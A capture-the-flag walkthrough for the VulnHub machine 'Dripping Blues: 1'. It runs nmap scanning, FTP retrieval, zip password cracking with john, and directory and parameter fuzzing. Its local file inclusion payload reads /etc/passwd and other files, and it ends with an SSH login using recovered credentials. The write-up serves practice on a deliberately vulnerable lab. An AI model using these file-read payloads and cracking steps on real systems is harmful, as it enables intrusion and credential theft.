<div class="page">

# Dripping Blues: 1

\

## 

## Dripping Blues: 1

- **<span style="color:#663e0e;">Dripping Blues: 1</span>** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/dripping-blues-1,744/>

![](images/4-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  <span style="color:#3584e4;">Network Scanning</span> :

- Find the machine IP :

<div class="codebox">

    nmap -sn 192.168.2.0/24

</div>

![](images/4-2.png)

- Run nmap master command :

<div class="codebox">

    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.123

</div>

![](images/4-3.png)

- Find available port in the machine ( Optional ) :

<div class="codebox">

    nmap -v -p- 192.168.2.123

</div>

- 

<div class="codebox">

    nmap -sC -sV -A 192.168.2.123

</div>

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

<div class="codebox">

    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.123

</div>

![](images/4-4.png)

1.  <span style="color:#3584e4;">FTP Enumeration</span> :

- FTP login :

<div class="codebox">

    ftp 192.168.2.123

</div>

- Check the file list :

<div class="codebox">

    ls

</div>

- Download the file :

<div class="codebox">

    get respectmydrip.zip

</div>

![](images/4-5.png)

- Unzip the file :

<div class="codebox">

     unzip respectmydrip.zip

</div>

![](images/4-6.png) Password required .

- Crack the zip file password :

<div class="codebox">

    zip2john respectmydrip.zip > hash.txt

</div>

![](images/4-7.png)

- Crack with john :

<div class="codebox">

    john hash.txt --wordlist=/opt/rockyou.txt

</div>

![](images/4-8.png)

- Unzip the file :

<div class="codebox">

    unzip respectmydrip.zip

</div>

- Read the txt file :

<div class="codebox">

    cat respectmydrip.txt

</div>

![](images/4-9.png)

1.  <span style="color:#3584e4;">Web Enumeration</span> :

- IP visit in browser : <http://192.168.2.123/>
  <http://192.168.2.123/robots.txt>
  <http://192.168.2.123/dripisreal.txt>

![](images/4-10.png)

- Run the gobuster for find the directory :

<div class="codebox">

    gobuster dir -u http://192.168.2.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50

</div>

![](images/4-11.png)

- Visit the index.php directory : <http://192.168.2.123/index.php>

<!-- -->

- This is LFI based now find the parameter :

<div class="codebox">

    wfuzz -u 'http://192.168.2.123/index.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 21

</div>

![](images/4-12.png)

- Visit the parameter and call the file :
  <http://192.168.2.123/index.php?drip=/etc/passwd>

![](images/4-13.png)

- Now call the file from the robots.txt endpoints :
  <http://192.168.2.123/index.php?drip=/etc/dripispowerful.html>

![](images/4-14.png)

- View the source code :

<div class="codebox">

    view-source:http://192.168.2.123/index.php?drip=/etc/dripispowerful.html

</div>

![](images/4-15.png)

- Password Found :

<div class="codebox">

    imdrippinbiatch

</div>

- Username is given through the hint :

<div class="codebox">

    travisscott 
    thugger

</div>

1.  SSH Access :

- Try to login ssh :

<div class="codebox">

    ssh thugger@192.168.2.123

</div>

![](images/4-16.png)

</div>
